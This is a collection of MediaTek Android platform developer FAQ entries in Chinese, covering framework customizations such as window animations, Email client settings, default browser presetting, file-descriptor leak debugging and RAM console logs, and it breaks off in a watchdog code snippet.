## [RTL]  [FAQ09002]  阿拉伯语下，为何添加账户时输入密码区域的提示语左对齐

```text
1.预置条件：
系统语言设置为阿拉伯语
2.操作步骤：
电子邮件-账户设置
【实际结果】
用户名输入在右边，密码输入在左边
[SOLUTION] 
这是google默认的设计，android4.2.1及以后的版本密码编辑框都是按照从左向右显示的。
如果确实需要实现居右可以按照如下修改：
TextView.java(alps\frameworks\base\core\java\android\widget)
TextDirectionHeuristic getTextDirectionHeuristic() {
    if (hasPasswordTransformationMethod()) {
        // passwords fields should be LTR
        return TextDirectionHeuristics.LTR;//改为 return TextDirectionHeuristics. LOCALE
    }
```

## [FAQ03091]  如何限制计算器输入框输入多个无效“0”

```text
在Logic.java中修改方法acceptInsert，增加红色标注的语句：

boolean acceptInsert(String delta) {
    String text = getText();
    //mtk added for calculator
    if (text.equals("0") && delta.equals("0")) {
        //return false;
        //mtk added for calculator
        return !mIsError && (!mResult.equals(text) || isOperator(delta) || mDisplay.getSelectionStart() != text.length());
    }
}
```

## [calculator]  [FAQ07239]  SD卡配置方案介绍

```text
由于MTK Default Release的SD卡方案以内置SD卡为主（支持EMMC双卡）,但内置SD容量较小而容易塞满，且不能有效利用外置SD卡空间。
[SOLUTION] 
针对此问题，MTK开发几种SD卡的配置方案，具体信息可参考如下：
视频：
MTK On Line上搜索“SD卡配置方案介绍”，此视频分别介绍了：MTK offical方案，sdswap外部sd卡优先方案，完全无内置sd方案，shared sdcard方案，FAT on nand方案。
其中JB/JB2/JB3/JB5的修改方法同ICS,但除fat on nand方案之外，其他方案在JB/JB2/JB3/JB5上都不需申请patch。
文档：
1.      DCC上下载“SD卡配置方案介绍.pptx”,该文档属于上述视频对应的文档；
2.      DCC上下载“Multi-Storage_Application_Note”这篇文档，该文档介绍EMMC双卡下的方案（外置sd卡优先方案、无内置sd卡方案）；
3.      DCC上下载“Shared sdcard Appliction Note_V1.0”这篇文档,该文档介绍内置sd卡与data分区共享空间的方案
4.      DCC上下载“FAT on NAND Application Note”这篇文档，该文档介绍在nand flash上虚拟出一块区域当作内置sd卡使用的方案
```

## [FAQ04501]  如何去掉横竖屏切换时的转屏动画?

```text
性能不好的手机上，当在横竖屏画面之间进行切换时会觉得屏幕有些卡。如果在“设置”-> “开发人员选项”中关掉窗口过渡动画，就不会有卡的问题，但这样一来，所有窗口画面的动画切换效果都没有了。如果只想在横竖屏切换时关掉切换动画，应该如何实现呢?
[SOLUTION] 
可以修改WindowManagerService.java中的boolean值：static final boolean CUSTOM_SCREEN_ROTATION = true;  把默认的true修改成false，然后重新mm frameworks/base/services/java，并把新生成的services.jar档案push到手机，reboot手机。
```

## [FAQ04500]  如何客制化某两个activity切换时的窗口动画?

```text
Activity.java中提供了一个可供ap端override窗口切换动画效果的方法：
public void overridePendingTransition(int enterAnim, int exitAnim)
以Launcher中使用这个API的代码为例：
// Launcher.java
public void onClickVoiceButton(View v) {
    v.performHapticFeedback(HapticFeedbackConstants.VIRTUAL_KEY);
    try {
        final SearchManager searchManager = (SearchManager) getSystemService(Context.SEARCH_SERVICE);
        ComponentName activityName = searchManager.getGlobalSearchActivity();
        Intent intent = new Intent(RecognizerIntent.ACTION_WEB_SEARCH);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        if (activityName != null) {
            intent.setPackage(activityName.getPackageName());
        }
        startActivity(null, intent, "onClickVoiceButton");
        // R.anim.fade_in_fast和R.anim.fade_out_fast分别表示要启动的activity 窗口的enterAnim资源ID和exitAnim资源ID
        overridePendingTransition(R.anim.fade_in_fast, R.anim.fade_out_fast);
    } catch (ActivityNotFoundException e) {
        Intent intent = new Intent(RecognizerIntent.ACTION_WEB_SEARCH);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivitySafely(null, intent, "onClickVoiceButton");
    }
}
```

## [FAQ03556]  [Settings] 蓝牙设置界面高级选项功能解析

```text
1、文件传输服务：是指蓝牙 File Transfer Profile (FTP)，允许支持蓝牙FTP客户端的蓝牙设备进行连接，实现对服务端文件的访问和操作。
2、远程SIM卡模式：是指蓝牙SIM Access Profile（SAP），允许带有内置 GSM 收发器的车载电话之类的设备连接到蓝牙电话中的 SIM 卡，因此车载电话本身并不需要单独的 SIM 卡。
3、蓝牙网络热点：是指蓝牙PAN profile的NAP——Network Access Point，为其他蓝牙设备提供访问Internet功能，类似于网络设备的网桥或者代理服务器，PC机通过蓝牙连接手机蓝牙后，使PC机通过手机上网的功能。PC机要先安装蓝牙软件Bluesoleil，断开本地PC机的局域网（即公司的内部局域网），确认手机可以通过GPRS上网，即可通过该软件连接NAP实现上网功能。
4、蓝牙局域网：是指蓝牙PAN profile的GN——Group Ad-hoc Network，允许支持蓝牙组网功能的其他蓝牙设备组成蓝牙局域网。
5、远程信息访问：是指蓝牙Message Access Profile (MAP), 允许支持蓝牙远程信息访问的蓝牙车载设备访问手机上的短信、彩信和邮件。
```

## [FAQ04499]  如何去掉activity启动时的启动窗口(starting window)? 如何修改启动窗口的背景色?

```text
用户看到的“闪一下黑色”的画面，其实是应用程序的“启动窗口”(starting window)。启动窗口有以下特点：
1， 仅在要启动的activity在新的task或者新的process时，才可能显示启动窗口
2， 启动窗口先于activity窗口显示，当activity窗口的内容准备好之后，启动窗口就会被移除掉，show出真正的activity window
3， 启动窗口和普通的activity window类似，只是没有画任何内容，默认是一个黑色背景的窗口
正是由于启动窗口默认是黑色背景的，所以在当前的手机主题为浅色调的时候，就比较容易因为颜色的深浅对比而产生一种视觉上的闪动感。

针对以上情况的解决方法：
- 修改方案一：去掉启动窗口（不显示启动窗口）
- 修改方案二：修改启动窗口的背景颜色（修改成和主题颜色比较接近的颜色）

修改方案一：去掉启动窗口。做法如下：
修改ActivityStack.java文件，如下：
static final boolean SHOW_APP_STARTING_PREVIEW = true;  // 把这里的true修改成false
重新执行./makeMtk project_name mm frameworks/base/services/java，并把services.jar 重新push到手机并reboot

修改方案二：修改启动窗口的背景颜色。做法如下：
修改PhoneWindowManager.java中的方法addStartingWindow，如下：
public View addStartingWindow(IBinder appToken, String packageName, int theme, CompatibilityInfo compatInfo, CharSequence nonLocalizedLabel, int labelRes, int icon, int windowFlags) {
    . . . . . .
    View view = win.getDecorView();
    //mtk added begin
    View.setBackgroundColor(...);     //把默认的黑色背景修改成和当前手机主题颜色相近的颜色
    //mtk added end
    . . . . . .
    wm.addView(view, params);
    . . . . . .
}
```

## [FAQ08845]  怎样延长锁屏界面显示时间?

```text
屏灭状态，按power键，显示锁屏界面，然后又进入灭屏状态，现在显示锁屏界面，到又进入灭屏状态大概5s，怎样延长该时间到15s。
[SOLUTION] 
修改KeyguardViewMediator.java中的KEYGUARD_LOCK_AFTER_DELAY_DEFAULT的值。
```

## [FAQ08935]  Email账户自动建立参数预置

```text
如果需要预置一些邮件服务账户的参数信息到Email Client端，如
邮箱域名为mail.ru, list.ru, inbox.ru, bk.ru, corp.mail.ru自适应如下参数：
Incoming Server: imap.mail.ru
Incoming Server Port: 993
Ssl on the incoming server: enabled
Username: full email user
Outgoing Server: smtp.mail.ru
Outgoing server port: 465
Ssl on the outgoing server: enabled
Protocol: IMAP4
 
[SOLUTION] 
自定义预置邮箱配置：
首先您可能要做的改动是去配置Email/res/xml/providers.xml 中的 incoming 和 outgoing 的URI。
该URI是由如下几部分组成的：
    协议类型 + 安全类型 +：// 服务器地址。
Server port 是不需要专门去配置的，因为他是由 协议类型和是否使用SSL来确定的。
如果您需要使用SSL，那么您在配置的时候就不用去添加trustallcerts部分，应该配置成类似这样的： imap+ssl+://imap.163.com 
Protocol的配置就是上面说的 协议类型 部分，后面的服务器地址部分应该和协议类型对应
```

## [Email]  [FAQ08939]  Email 客户端支持的最大附件大小与邮件大小

```text
1. Maximum size of attached files for download (KB)
    GPRS: 5M
    WIFI: Not limits
2. Maximum size of messages (KB)
    Not limits
```

## [Email]  [FAQ08938]  Email 客户端中 Push 与 SmartPush的区别

```text
1. Push就是Exchange protocol的一个概念, 简单说就是有新的信来服务器就会及时通知我们client去收信.
2. Smart push是我们Email client特别添加的一个功能, 刚开始2-3天跟push一样, 但它后台会自动收集用户的使用习惯, 收集到一定量后就会按照一个算法来推算出一系列的sync interval值(一天24小时,每2小时一个值, 一共12个值), 然后按照这些值每2小时自动调整一次收信的的sync interval (可能自动调节为push, 1hour或never), 以达到省电的目的 (普通push电耗高一些).
 
SmartPush特点：
1. 計算是一天才計算一次,  sync interval的值會是三種中的一種, 調整sync interval的時間點會在以2小時為單位的整點.
舉個例子:  今天下午3:20進行了一次計算, 會得出12個時間段的12個值, 然後到了4:00就會按照4:00的值進行調整, 6:00又會進行一次調整(假如4:00和6:00的值一樣則不用做調整).
2. SmartPush存在用戶的使用習慣不規律, 造成計算結果不能很貼合實際使用情況的風險. 所以在建賬戶時會有一個smartpush的提示對話框給用戶.
3. 我們採集三種action: 1. 有一封新mail到來  2.用戶進入了一次Email app , 3 用戶使用一次Email app的duration.
4. 算法裏面有按照一定權重配比來根據action的數據進行計算, 最终会生成一个代表用户在某个时间段使用Email的期望值，值越高代表用户可能越想在这个时间点使用Email，即更希望邮件即时被收到.
```

## [Email]  [FAQ08937]  Email中支持的邮件协议

```text
1. POP3
2. IMAP4
3. Exchange 2003, 2007, 2007SP1, 2010.
 
PS.
是否支持Notes?
Lotus Notes是私有协议，如果Notes Server允许使用POP3或者IMAP方式登录，则支持，否则就不支持。
```

## [Email]  [FAQ08945]  请问一下Email 、Exchange 与google原生的Email相比，做了哪些改动呢?

```text
请问一下我们MTK的Email 和Exchange 与google原生的Email相比，做了哪些改动呢?
[MTK:] 
MTK对Email及Exchange的修改主要是bug fix和极少数的new feature.
Email中new feature增加了VIP, local search, partial download, Out of Office等。
Exchange中主要增加了Smart Push和partial download， 另外有对原生的Exchange中存在的一些电耗问题做修改。
```

## [Email]  [FAQ08943]  邮件客户端为什么在重启后仅保留25封邮件，更早的邮件会丢失

```text
1.为什么没有重启手机前已经在收件箱中查看到有50封邮件，重启后就只有前25封邮件了?
[MTK:] 
在Email中有个机制是对可见邮件数目的控制，即通过一个可见邮件限制来控制默认的邮件数量，默认是25，当第一次建立账户时，就会同步这么多信，且每次load more时也会多下载25封。
如果已经同步了50封信，此时对手机进行重启，或者Email进程因为任何原因退出，那么下次启动Email时则会重新应用25封这个可见邮件限制，那么会重新与Server同步一次看看是否有新邮件，并仅保留25封最新的信，因此会出现你提到的问题。
另外你所述有时会偶然碰到不重启也恢复到25，就是因为Email进程退出了（比如用户手动杀进程，Low memory killer， background process kill等）。
 
2.如果在50封邮件可见的时候，将数据连接断掉，然后重启手机，此时进入收件箱会是原来的50封邮件，不知道这是为什么?
[MTK:] 
如上面提到的，当下次启动Email时，会重新与Server同于一次看看是否有新邮件，并保留25封最新的，但如果网络中断，则会同步失败，那么就会走不到删除流程，会等到同步成功后再删除。
这样设计的目的是Email的内容全部存储在data partition, 为了防止所占的ROM空间无限增大，所以做了这样一个限制的策略。
相关文件在：
Fille:  Email/src/com/android/email/Email.java
public static final int VISIBLE_LIMIT_DEFAULT = 25;
You could change this number to define how many messages default to display.
每次Email启动时，会在Email.java中重新应用上面这个数目限制，通过下面的方法。
 Controller.getInstance(this).resetVisibleLimits();
如果想改变25这个数目，可以修改上面的宏，但仍然会被reset，如果想不被删除已下载的邮件，则请注释掉下面那句调用。
```

## [FAQ07810]  [GPS] GPS Co-clock 是否需要进行校准?

```text
GPS Co-clock 是需要在产线进行校准的，是在RF站位完成RF校准之后校准，按照标准流程，是需要7~10s的校准时间，不需要额外的仪器和站位。 详细请参考如下文档 MT6572平台： MediaTek DCC > External Document > SW > 3G Phone Data > Smart Phone > Standard Package > MT6572 SW Doc Package > Connectivity > GPS > MT6572_6582_GPS_coclk_factory_tool_SOP_V1 0.pdf MT6582 平台：MediaTek DCC > External Document > SW > 3G Phone Data > Smart Phone > Standard Package > MT6582 SW doc package > Connectivity > GPS > MT6572_6582_GPS_coclk_factory_tool_SOP_V1 0.pdf
```

## [Dialer]  [FAQ09512]  如何修改拨号盘中号码显示分隔符，由现在的空格符修改为"-"符号

```text
经过分析，发现拨号盘中输入的号码的空格分隔符是由如下方法(红字表示的地方)设置了format所引起的。
Dialpadfragment.onCreateView(...){
    ......
    PhoneNumberFormatter.setPhoneNumberFormatteringTextWatcher(getactivity(),mDigits,mHandler);
    ......
}
从上述方法(红字表示的地方)进一步跟踪代码，可找到代码的修改点(红字表示的地方)是如下文件中的如下方法：
1.frameworks\base\telephony\java\android\telephony\PhoneNumberFormattingTextWatcher.java
private String reformat(CharSequence s, int cursor) {
    // The index of char to the leftward of the cursor.
    int curIndex = cursor - 1;
    String formatted = null;
    mFormatter.clear();
    char lastNonSeparator = 0;
    boolean hasCursor = false;
    int len = s.length();
      for (int i = 0; i < len; i++) {
        char c = s.charAt(i);
        if (PhoneNumberUtils.isNonSeparator(c)) {
            if (lastNonSeparator != 0) {
                formatted = getFormattedNumber(lastNonSeparator, hasCursor);
                hasCursor = false;
            }
            lastNonSeparator = c;
        }
        if (i == curIndex) {
            hasCursor = true;
        }
    }
    if (lastNonSeparator != 0) {
        formatted = getFormattedNumber(lastNonSeparator, hasCursor);
    }
  
    if(formatted != null) {
        formatted = formatted.replace(" ", "-");//add by MTK 20130117
    }
    String tmpFormatted = formatted;
    String tmpS = ((CharSequence)s).toString();
    tmpS = tmpS.replace("-","");//add by MTK 20130117
    if (tmpFormatted != null) {
        tmpFormatted = tmpFormatted.replace(" ", "").replace("-", "");
        if (tmpS.trim().length() > tmpFormatted.length()) {
            //Log.d("reformat", "s.length() > tmpFormatted.length()");
            formatted = ((CharSequence)s).toString();
        }
    }
    return formatted;
}
```

## [FAQ03066]  Settings中About Phone的Model number等信息的修改

```text
修改alps\build\tools\buildinfo.sh
-修改echo "ro.build.display.id=$BUILD_DISPLAY_ID", 把 $BUILD_DISPLAY_ID 修改成其他的名称可改变 Build Nubmer. 注意此时要去除$.
-修改echo "ro.product.model=$PRODUCT_MODEL",   把  $PRODUCT_MODEL 修改成其他的名称可改变 Model Nubmer. 注意此时要去除$
-修改echo "ro.build.version.release=2.1" , 中的2.1, 可改变显示的Firmware version

-但是做上述修改时需要注意，某些属性是跟fingerprint相关的，如果修改了跟fingerprint相关的属性，那么ro.build.fingerprint也要做出相应修改
原始状态下ro.product.fingerprint属性设置如下：echo “ro.build.fingerprint=$BUILD_FINGERPRINT”
其中$BUILD_FINGERPRINT=$( PRODUCT_BRAND)/$(PRODUCT_NAME)/$( TARGET_DEVICE):$( PLATFORM_VERSION)/$(BUILD_ID)/$(BUILD_NUMBER):$( TARGET_BUILD_TYPE)/$( BUILD_VERSION_TAGS)
=>[ro.build.brand] /[ro.product.name] /[ro.product.device] :[ro.build.version.release] /[ro.build.id] /[ro.build.version.incremental] :[ro.build.type] /[ro.build.tags] 
所以，如果修改了ro.build.brand、ro.product.name、ro.product.device、ro.build.version.release、ro.build.id、ro.build.version.incremental、ro.build.type、 ro.build.tags这些属性
那么，ro.product.fingerprint的属性设置需要做出修改
假如贵司修改了”echo ro.product.name=test_name”，那么ro.product.fingerprint的属性设置需要修改为：
echo "ro.build.fingerprint=${PRODUCT_BRAND}/test_name/${TARGET_DEVICE}:${PLATFORM_VERSION}/${BUILD_ID}/ ${BUILD_NUMBER}:${TARGET_BUILD_TYPE}/${BUILD_VERSION_TAGS}"

Baseband Version 直接写在 modem.img 中，开机后modem 自动推送到AP 端。

Kernel Version 为linux 编译过程中产生, 按照标准的linux格式生成(compile.h), 最后版本信息写在文件/proc/version 下，所有的版本信息即在该文件的第 一行，然后使用了一个正则表达式过滤了版本信息中一些字符，参考DeviceInfoSettings 下的getFormattedKernelVersion 方法。
```

## [debug]  [FAQ09558]  如何快速获取完整的调试信息

```text
当手机发生异常，不确定需要取哪些log来调试时，推荐使用GAT Bugreport功能，它会一键打包完整的调试信息。

以GAT 3.0为例，步骤如下：
1. 进入设置 -> 确认USB Debugging是开启的  （GAT依赖adb，因此要确认adb可用）
2. 将问题机连USB至PC
3. 打开GAT （确认已连接上，视图Devices中会显示手机name）
4. 点击工具栏 -> Bugreport （蜘蛛形状的按钮）
5. 此时会弹出框，在后台运行脚本，最后生成一个压缩包(mtk_bugreport_xxxxxx_xxxxxx.zip)。
 
如下图所示：
```

## [browser]  [FAQ09535]  当系统存在多个浏览器时，如何预置某个浏览器为系统默认的浏览器?

```text
以设定UC浏览器为默认浏览器为例：

设计思路：第一次开机默认选择UC浏览器来打开网页,而且用户也是可以清除该默认选择的浏览器的，如果用户清除默认的浏览器设置,那么我们也保留用户的选择,直到reset机器。

具体方法：

1.在PackageManagerService.java中的构造函数结尾添加：setDefaultBrowser();

2.setDefaultBrowser()的具体实现：

private final void setDefaultBrowser(){
    Log.d("debug_default","setDefaultBrowser is called.");
    if (!isFirstBoot()) {
        Log.d("debug_default","not first boot, return");
        return;
    }
    String str1 = "android.intent.category.DEFAULT";
    String str2 = "android.intent.category.BROWSABLE";
    String str3 = "android.intent.action.VIEW";
    //intent filter
    IntentFilter filter = new IntentFilter(str3);
    filter.addCategory(str1);
    filter.addCategory(str2);
    filter.addDataScheme("http");
    //intent
    Intent intent = new Intent(str3);
    intent.addCategory(str2);
    intent.addCategory(str1);
    Uri uri = Uri.parse("http://");
    intent.setDataAndType(uri, null);
    //set UC，if your want set other browser as default, modify below code, add package name and activiy name
    ComponentName component = new ComponentName("com.UCMobile","com.UCMobile.main.UCMobile");
    //find all browsers
    List<ResolveInfo> resolveInfoList = queryIntentActivities(intent,intent.getType(),PackageManager.GET_INTENT_FILTERS);
    int size = resolveInfoList.size();
    ComponentName[]  arrayOfComponentName = new ComponentName[size] ;
    //make sure the default browser in phone
    boolean no_UC = true;
    for (int i = 0; i < size; i++) {
        ActivityInfo activityInfo = resolveInfoList.get(i).activityInfo;
        String packageName = activityInfo.packageName;
        String className = activityInfo.name;
        //if your want set other browser as default, modify below package name
        if (packageName.equals("com.UCMobile")) no_UC = false;
        ComponentName componentName = new ComponentName(packageName, className);
        arrayOfComponentName[i]  = componentName;
    }
    if (no_UC) {
        Log.d("debug_default","no uc package");
        return;
    } else {
        Log.d("debug_default","uc package is in, set it as Preferred.");
    }
    //set default
    addPreferredActivity2(filter,IntentFilter.MATCH_CATEGORY_SCHEME, arrayOfComponentName,component);
    Log.d("debug_default","add UC to PreferredActivity");
}

3.增加addPreferredActivity2接口（还是在PackageManagerService.java中）：

public void addPreferredActivity2(IntentFilter filter, int match, ComponentName[]  set, ComponentName activity) {
    Log.d("debug_default","addPreferredActivity2 is called.");
    // writer
    synchronized (mPackages) {
        Slog.i(TAG, "Adding preferred activity " + activity + ":");
        filter.dump(new LogPrinter(Log.INFO, TAG), "  ");
        mSettings.mPreferredActivities.addFilter(
        new PreferredActivity(filter, match, set, activity));
        scheduleWriteSettingsLocked();
    }
}

上面是设置UC 为默认浏览器的方法，如果要设置其他浏览器为系统默认，需要修改两个地方：

1.ComponentName component = new ComponentName("packageName ","activityName");
2.if (packageName.equals("packageName")) no_UC = false;
其它都不变。
packageName代表要设置为默认浏览器的那个browser对应的包名，activityName代表要设置为默认浏览器的那个浏览器对应的类名。
红色标注的API，在android新版本上由于支持multi-user的缘故，所以接口定义发生改变，有两处需要修改（上面红色标记的语句）：

1, 把List<ResolveInfo> resolveInfoList = queryIntentActivities(intent,intent.getType(),PackageManager.GET_INTENT_FILTERS);

修改成:

List<ResolveInfo> resolveInfoList = queryIntentActivities(intent,intent.getType(),PackageManager.GET_INTENT_FILTERS, 0);

2,把
mSettings.mPreferredActivities.addFilter(new PreferredActivity(filter, match, set, activity));
scheduleWriteSettingsLocked();
修改成
mSettings.editPreferredActivitiesLPw(0).addFilter(new PreferredActivity(filter, match, set, activity));
mSettings.writePackageRestrictionsLPr(0);
```

## [clock]  [FAQ09666]  时钟和日历里的Home time zone显示不一致

```text
时钟里的Home time zone跟日历里的Home time zone本身就是不一致的
日历的的时区是：家所在时区
时钟里的时区是：当前所在的时区
家所在时区：这个功能主要是为了方便，在出差或者旅行时，用户不在国内在境外的时候，在日历中设置家所在时区，可以随时了解到国内的当前时间和日期
```

## [FAQ09651]  设置-开发者选项-严格模式(Strict mode)开关从On设为Off后，还会闪红色边框是否正常?

```text
手机的设置-开发者选项-严格模式(Strict mode)菜单，当其开关从On设为Off后，再去操作手机的其他界面，有时候还是会闪烁红色边框；
那这个现象是否正常?
 
[SOLUTION] 
开发者选项是在ViewRoot被创建起来时才会去读取当前的开关状态（ViewRoot是App启动过程中当Activity/Window被创建之后才创建的）；
例如应用A启动时，发现这个选项是开着的，那它在某些情况下就会闪烁红色边框，此时去设置中把这个选项关闭，但如果应用A还是在后台运行并没有被kill掉时，当它在回到前台运行时，还是会闪烁红边框，只有当应用A真正退出并且process死掉之后，当下次再重新创建ViewRoot时，读取的才是最新的值。
所以这并不是一个bug；
 
当然，如果开关已经设置为Off了，并且手机已经reboot过了，开机之后经过检查开关依然为Off的情况下，如果再去操作手机其他界面时还是会闪红色边框，那就不正常了；如果遇到这种情况，请提交eService，并提供复现问题的操作视频和闪红边框的截图，以及对应的mobile log。
```

## [FAQ09665]  MTP和PC数据同步时所支持的文件格式

```text
具体支持的媒体文件格式如下结构体所示：
private int[]  getSupportedPlaybackFormats() {
    return new int[]  {
        // allow transfering arbitrary files
        MtpConstants.FORMAT_UNDEFINED,
        MtpConstants.FORMAT_ASSOCIATION,
        MtpConstants.FORMAT_TEXT,
        MtpConstants.FORMAT_HTML,
        MtpConstants.FORMAT_WAV,
        MtpConstants.FORMAT_MP3,
        MtpConstants.FORMAT_MPEG,
        MtpConstants.FORMAT_EXIF_JPEG,
        MtpConstants.FORMAT_TIFF_EP,
        MtpConstants.FORMAT_BMP,
        MtpConstants.FORMAT_GIF,
        MtpConstants.FORMAT_JFIF,
        MtpConstants.FORMAT_PNG,
        MtpConstants.FORMAT_TIFF,
        MtpConstants.FORMAT_WMA,
        MtpConstants.FORMAT_OGG,
        MtpConstants.FORMAT_AAC,
        MtpConstants.FORMAT_MP4_CONTAINER,
        MtpConstants.FORMAT_MP2,
        MtpConstants.FORMAT_3GP_CONTAINER,
        MtpConstants.FORMAT_ABSTRACT_AV_PLAYLIST,
        MtpConstants.FORMAT_WPL_PLAYLIST,
        MtpConstants.FORMAT_M3U_PLAYLIST,
        MtpConstants.FORMAT_PLS_PLAYLIST,
        MtpConstants.FORMAT_XML_DOCUMENT,
        MtpConstants.FORMAT_FLAC,
    };
}
注：当PC为XP系统时，要求WMP的版本要为10或者11
```

## [snippet] android 判断是否是第三方应用

```text
系统内置应用对应的flag为 ApplicationInfo.FLAG_SYSTEM

boolean isSystemApp(Application aInfo) {
    if ((aInfo.flags & aInfo.FLAG_SYSTEM) == 0) {
        return false;
    } else {
        return true;
    }
}
```

## [FAQ09578]  如何确定GIF播放时间

```text
gif播放的原理是这样：
1. 依次从gif file里面读取出每一帧，以及每一帧的duration
2. 先播放第一帧，间隔该帧duration之后再播放下一帧

alps/mediatek/frameworks/base/media/gif/java/com/mediatek/gifdecoder.java
里面有定义MINIMAL_DURATION

MINIMAL_DURATION = 40
这个改动其实也是针对特别的case，为了是播放平滑，所以修改为40的，可以修改这个值，或者自行调整这个值。
```

## [sound]  [FAQ08421]  [Audio App] 在播放器界面,使用侧键如何调整Media音量

```text
在当前界面对应的XXXActivity.onCreate方法中，加上如下
setVolumeControlStream(AudioManager.STREAM_MUSIC);
```

## [FM]  [FAQ09179]  [Audio App] 后台播放FM或者Music，前台进入VideoPlayer再退出，后台不能恢复

```text
方案一:
请按照如下修改2个地方：
1.   在fmradioservice.java中onReceive方法
private class FMServiceBroadcastReceiver extends BroadcastReceiver {
。。。。。。。。。
    // other app want FM stop, stop FM
    if (ACTION_TOFMSERVICE_POWERDOWN.equals(action) || ACTION_FROMATVSERVICE_POWERUP.equals(action)
            || (SOUND_POWER_DOWN_MSG.equals(action) && CMDPAUSE.equals(command))) {
        // need remove all messages, make power down will be execute
        mFmServiceHandler.removeCallbacksAndMessages(null);
        stopFMFocusLoss(AudioManager.AUDIOFOCUS_LOSS_TRANSIENT);//修改该句
。。。。。。。。。

2.在mediaplaybackservice.java中onReceive方法
。。。。。。。。。
else if (CMDPAUSE.equals(cmd) || PAUSE_ACTION.equals(action)) {
pause();
mPausedByTransientLossOfFocus = true;//修改此行
}
。。。。。。。。。

方案二:
在MTKVideoView.java的openVideo()方法中移除如下代码：
。。。。。。。。。
// Tell the music playback service to pause
// TODO: these constants need to be published somewhere in the framework.
final Intent i = new Intent("com.android.music.musicservicecommand");
i.putExtra("command", "pause");
mContext.sendBroadcast(i);
```

## [性能]  [FAQ09897]  如何修改可以缩短Activity进入和退出画面时的动画播放时间

```text
在 frameworks/base/services/java/com/android/server/wm/WindowManagerService.java 中找到如下方法，并做修改
private Animation createScaleUpAnimationLocked(int transit, boolean enter) {
    Animation a;
    // Pick the desired duration.  If this is an inter-activity transition,
    // it  is the standard duration for that.  Otherwise we use the longer
    // task transition duration.
    int duration;
    switch (transit) {
        case WindowManagerPolicy.TRANSIT_ACTIVITY_OPEN:
        case WindowManagerPolicy.TRANSIT_ACTIVITY_CLOSE:
            duration = mContext.getResources().getInteger(
                    com.android.internal.R.integer.config_shortAnimTime);
            break;
        default:
            duration = 300;
            /// M: For Low Bandwidth Application Transition Animation @{
            if (FeatureOption.MTK_LOW_BAND_TRAN_ANIM) {
                duration = 200;
            }
            /// @}
            break;
    }
    //在此处重新设置duration的值，
   //上面的代码是去读取默认的配置，默认值是300，你可以依次逐渐减少该值，如250，200，150，100
   //你自己感觉这些值的效果，看哪个满意，你就用哪个；
    // TODO(multidisplay): For now assume all app animation is on main display.
    final DisplayInfo displayInfo = getDefaultDisplayInfoLocked();
    if (enter) {
```

## [nvram]  [FAQ09867]  【pro_info】如何使用pro_info分区来存储标记?

```text
在很多情况下，需要使用一个flag来标记各种场景，比如开机logo切换，开机动画切换等等。以72为例，介绍用pro_info来存储这个标记，这样既可以在LK/Uboot中访问这个标记，同时在上层可以通过nvram的接口来读写这个标记。
 
[SOLUTION] 
使用pro_info分区来存储标记，需哟做哪些工作?
1，客制化一个nvram item
请参考《customization inNvRAM.ppt》
2,客制化pro_info
请参考《Customization in NvRAM Product Info feature.pptx》
3,Uboot/LK读取标记
（1）在load_image.c中写一个读取标记的接口
–In the path of alps\bootable\bootlaoder\lk\platform\mediatek\mt65XX\LK 
（2）demo code

（3）dev->read（）
Start_addr：起始block的地址，一个block对应的是512个Byte.如果在g_new_nvram_lid[] 中有多个LID，那么就要根据ABLE_FOR_SPECIAL_LID     的start_address来计算偏移，如start_address =128*1024， 那么start_addr=part->startblk*BLK_SIZE+128*1024 . 

4,apk中读写标记
请参考FAQ ：FAQ04542

如果还有其他疑问，请提交E-service，tks。
```

## [FAQ09554]  How to open/read/write UART in APP?

```text
Refer to file: ./mediatek/factory/src/util/uart_op.c.

Operating UART is the same as that on the PC platform. You can google for related information,
e.g. http://www.ibm.com/developerworks/cn/linux/l-serials/
```

## [FAQ09810]  文件句柄开启过多导致系统异常排查方法

```text
大多数系统异常重启问题首先就要要查看system_server是否存在异常行为，并在相关时间点确认kernel log中是否异常。如果在相关时间点出现如下sample log,需要做如下描述的进行确认FD的行为。
<3>[  733.216078]  (0)[802:Binder Thread #] binder: 109:802 no unused fd available, -24
<6>[  733.216099]  (0)[802:Binder Thread #] binder: 109:802 transaction failed 29201, size
104-4

从no unused fd available这个log可以得知当前的fd已经使用达到上限，超过了1024个文件句柄上限。所以这个时候需要追查是什么一直在开启文件句柄而没有关闭。需要输入以下命令：
adb shell ps -p -t system_server找到system_server的PID是269.然后使用开始复现现象，从第一次模拟开
始就输入如下命令：adb shell ls -l /proc/269/fd>d:\fd.log记录下状态,然后每隔一段时间后都用上面命令进
行记录。

以本例为例：从dump出来的fd log中可以明显看到：

data/app/com.jiubang.goscreenlock.theme.watch-1.apk 所使用的fd数量由最开始的40个一直
增加到出问题的743个，fd爆掉了导致系统异常重启。
所以需要检查该ap的行为，在关闭或退出该ap的时候即使关闭所占用的文件句柄以免造成系统异常。
```

## [log]  [FAQ09185]  log里面有last_kmsg是系统有异常了么?

```text
在讲last_kmsg之前，我们讲一下什么是ram console。
 
首先，在kernel里面通过printk吐log的时候会是下面的一个过程：
1. printk会将信息格式化到kernel log buffer里面去。
2. 然后将这些格式化信息送到console去，在我们的系统里面有两个console，一个是uart console，一个是ram console。uart console里面的内容呢就是我们看到的uart log了。

那ram console是如何工作的呢?
1. RAM Console是位于Internal SRAM上面的一个小的buffer。
2. 结合上图与下图我们可以知道，系统运行的时候kernel log将不会被记录在RAM Console里面。
3. 一旦发生了重启，log将会停止记录到RAM console，直到RAM Console再次初始化好。
4. 在RAM Console初始化的时候会将buffer里面原有的数据做备份，拷贝到另外一个buffer，这个buffer的数据我们可以通过/proc/last_kmsg来访问。
 
那结论是什么呢?
1. RAM Console是一种log机制，它可以记录重启前最后时刻的一段log，来说明系统最后做了哪些事情。
2. 只要是重启，不管是异常重启还是通过adb reboot，或者通过菜单重启，都会有last_kmsg，这是一种log机制，与exception机制没有直接联系。
 
但是这里面也有一些限制：
1. 由于重启之后DRAM数据会丢失，所以只能将RAM Console放到Internal SRAM。
2. 但是由于Internal SRAM空间有限，只能划分出7KB~9KB的空间给RAM Console使用，所以能够记录的log是很短的。
```

## [debug]  [FAQ09188]  如何在代码中Kick Watchdog呢?

```text
首先在kernel需要kick watchdog的前面加入如下代码：
enum wk_wdt_type {
    WK_WDT_LOC_TYPE,
    WK_WDT_EXT_TYPE,
    WK_WDT_LOC_TYPE_NOLOCK,
    WK_WDT_EXT_TYPE_NOLOCK,
};
extern void mtk_wdt_restart(enum wk_wdt_type type);
 
static void mtk_kick_wdt(void) {
